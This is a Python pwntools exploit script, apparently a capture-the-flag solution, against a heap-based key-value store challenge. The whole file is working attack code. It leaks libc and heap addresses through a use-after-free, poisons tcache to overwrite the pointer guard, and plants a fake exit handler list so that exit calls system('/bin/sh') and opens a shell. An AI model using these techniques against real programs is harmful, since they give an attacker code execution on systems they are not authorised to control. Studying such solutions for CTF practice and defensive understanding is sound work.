from pwn import *

HOST = 'chal.amt.rs'
PORT = 1346

exe = ELF('./chal_patched')
libc = ELF('./lib/libc.so.6')

context.binary = exe
context.terminal = ["tmux", "splitw", "-h"]

gs = '''
b main
c
'''

def start():
    if args.GDB:
        return gdb.debug([exe.path], gdbscript=gs)
    elif args.REMOTE:
        return remote(HOST, PORT)  
    else:
        return process([exe.path])

def db_create(idx, len_key, key, len_val, val):
    io.sendlineafter(b'>>> ', b'1')
    io.sendlineafter(b'>>> ', str(idx).encode())
    io.sendlineafter(b'>>> ', str(len_key).encode())
    io.sendlineafter(b'>>> ', key)
    io.sendlineafter(b'>>> ', str(len_val).encode())
    io.sendlineafter(b'>>> ', val)

def db_update(idx, val):
    io.sendlineafter(b'>>> ', b'2')
    io.sendlineafter(b'>>> ', str(idx).encode())
    io.sendlineafter(b'>>> ', val)

def read8bytehex():
    val = 0
    for i in range(8):
        c = io.recv(1)
        if c == b'\\':
            val += int(io.recv(3)[1:], 16) << 8 * i
        else:
            val += ord(c) << 8 * i
    return val

def db_read(idx):
    io.sendlineafter(b'>>> ', b'3')
    io.sendlineafter(b'>>> ', str(idx).encode())

    io.recvuntil(b'key = ')
    key = read8bytehex()

    io.recvuntil(b'val = ')
    val = read8bytehex()

    return key, val

def db_delete(idx):
    io.sendlineafter(b'>>> ', b'4')
    io.sendlineafter(b'>>> ', str(idx).encode())

io = start()

# leak libc base and heap base
db_create(0, 0x410, b'', 0x10, b'')
db_delete(0)
addr_libc_base, addr_heap_base = db_read(0)
addr_libc_base -= 0x21ace0
addr_heap_base = addr_heap_base << 12

libc.address = addr_libc_base
log.info(f'addr_libc_base = {addr_libc_base : #x}')
log.info(f'addr_heap_base = {addr_heap_base : #x}')

# create fake struct exit_function_list
db_create(
    0,
    0x410,
    pack(0) # next
    + pack(1) # idx
    + pack(4) # flavor
    + pack(0) # cxa.fn
    + pack(next(libc.search(b'/bin/sh\0'))), # cxa.arg
    0x10,
    b''
)

# overwrite fs:POINTER_GUARD
addr_pointer_guard = addr_libc_base - 0x2890
log.info(f'addr_pointer_guard = {addr_pointer_guard : #x}')
db_create(0, 0x10, b'', 0x10, b'')
db_delete(0)
db_update(0, pack(addr_pointer_guard ^ (addr_heap_base >> 12)))
db_create(0, 0x10, b'', 0x10, pack(libc.sym['system']))

# overwrite __exit_funcs
addr_exit_funcs = addr_libc_base + 0x21a838
log.info(f'addr_exit_funcs = {addr_exit_funcs : #x}')
db_create(0, 0x10, b'', 0x10, b'')
db_delete(0)
db_update(0, pack((addr_exit_funcs - 8) ^ (addr_heap_base >> 12)))
db_create(0, 0x10, b'', 0x10, pack(0) + pack(addr_heap_base + 0x2a0))

# exit
io.sendlineafter(b'>>> ', b'5')

io.interactive()
